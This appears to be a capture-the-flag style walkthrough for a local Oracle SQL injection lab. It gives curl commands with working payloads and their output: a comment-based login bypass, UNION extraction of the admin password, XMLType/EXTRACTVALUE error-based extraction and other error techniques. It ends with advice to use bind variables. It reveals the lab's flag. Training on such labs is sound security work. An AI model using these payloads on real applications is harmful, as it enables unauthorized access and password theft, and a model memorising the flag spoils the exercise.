<h4>Step 1: Test Normal Login</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Login</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab3" \<br> --data-urlencode "username=admin" --data-urlencode "password=test"<br><br>
        <span class="prompt">Username: </span>admin<br>
        <span class="prompt">Password: </span>test<br>
        <span class="prompt">SQL: </span>SELECT id, username, role FROM users WHERE username = 'admin' AND password = 'test'<br><br>
        <span class="prompt">Result: </span><strong>Login Failed.</strong> Invalid username or password.
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab3" \<br> --data-urlencode "username='" --data-urlencode "password=anything"<br><br>
        <span class="prompt">Username: </span>'<br>
        <span class="prompt">Password: </span>anything<br>
        <span class="prompt">Error: </span><strong>ORA-01756: quoted string not properly terminated</strong>
    </div>
</div>

<h4>Step 3: Authentication Bypass</h4>
<p>
    Comment out the password check to bypass authentication entirely.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Auth Bypass</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab3" \<br> --data-urlencode "username=admin' -- " --data-urlencode "password=anything"<br><br>
        <span class="prompt">Username: </span>admin' -- <br>
        <span class="prompt">Password: </span>anything<br>
        <span class="prompt">SQL: </span>...WHERE username = 'admin' -- ' AND password = 'anything'<br><br>
        <span class="prompt">Result: </span><strong>Login Successful!</strong> Welcome, admin (Role: administrator)<br>
        <span class="prompt">// Password check bypassed, but we need the flag (the actual password)</span>
    </div>
</div>

<h4>Step 4: Extract Password via UNION in Password Field</h4>
<p>
    The login form has two injectable fields. By injecting a UNION query into the password field,
    we can make the second SELECT return the password column as the "username" display value.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab3" \<br> --data-urlencode "username=admin" \<br>
        &nbsp;&nbsp;--data-urlencode "password=' UNION SELECT 1, password, 'x' FROM users WHERE username='admin' -- "<br><br>
        <span class="prompt">Username: </span>admin<br>
        <span class="prompt">Password: </span>' UNION SELECT 1, password, 'x' FROM users WHERE username='admin' -- <br>
        <span class="prompt">SQL: </span>...WHERE username = 'admin' AND password = '' UNION SELECT 1, password, 'x' FROM users WHERE username='admin' -- '<br><br>
        <span class="prompt">Result: </span><strong>Login Successful!</strong> Welcome, <strong>FLAG{or_xmltyp3_3rr0r}</strong> (Role: x)
    </div>
</div>

<h4>Step 5: XMLType() Error-Based Technique (Tested)</h4>
<p>
    The lab is designed to teach <code>XMLType()</code> error-based extraction. Oracle's
    <code>XMLType()</code> constructor parses a string as XML. By embedding a subquery result into
    deliberately malformed XML, the error message can leak the data.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. XMLType Test</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab3" \<br>
        &nbsp;&nbsp;--data-urlencode "username=' OR 1=EXTRACTVALUE(XMLType('&lt;a&gt;' || (SELECT password FROM users WHERE ROWNUM&lt;=1) || '&lt;/a&gt;'), '/a') -- " \<br>
        &nbsp;&nbsp;--data-urlencode "password=x"<br><br>
        <span class="prompt">Error: </span><strong>ORA-01722: invalid number</strong><br><br>
        <span class="prompt">Note: </span>In Oracle XE 21c, the XMLType/EXTRACTVALUE combination returns<br>
        ORA-01722 (invalid number) instead of leaking the content value.<br>
        The UNION approach above is more reliable on this platform.
    </div>
</div>

<h4>Step 6: Alternative Error Approaches</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Other Error Techniques</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">TO_NUMBER:          </span>' OR 1=TO_NUMBER((SELECT password...)) --<br>
        <span class="prompt">Error:              </span>ORA-01722: invalid number (value not shown)<br><br>
        <span class="prompt">UTL_INADDR:         </span>' OR 1=UTL_INADDR.GET_HOST_ADDRESS(...) --<br>
        <span class="prompt">Error:              </span>ORA-24247: network access denied by ACL<br><br>
        <span class="prompt">DBMS_ASSERT:        </span>' OR 1=DBMS_ASSERT.SQL_OBJECT_NAME(...) --<br>
        <span class="prompt">Error:              </span>ORA-44002: invalid object name (value not shown)<br><br>
        <span class="prompt">// Oracle XE error messages are less verbose than Enterprise Edition</span>
    </div>
</div>

<h4>Step 7: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_xmltyp3_3rr0r}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab3" \<br> --data-urlencode "username=admin" \<br>
        &nbsp;&nbsp;--data-urlencode "password=' UNION SELECT 1, password, 'x' FROM users WHERE username='admin' -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Login Successful!</strong> Welcome, FLAG{or_xmltyp3_3rr0r} (Role: x)
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle's <code>XMLType()</code> and <code>EXTRACTVALUE()</code>
    are classic error-based extraction tools. They work by embedding subquery results into XML
    strings and forcing parsing errors that leak the data. However, error verbosity varies by Oracle
    version: newer versions may suppress content in error messages. When error-based fails, UNION
    injection through alternative fields (like the password field) can extract data displayed in
    the application's response. Always use bind variables: <code>oci_bind_by_name()</code>.
</div>
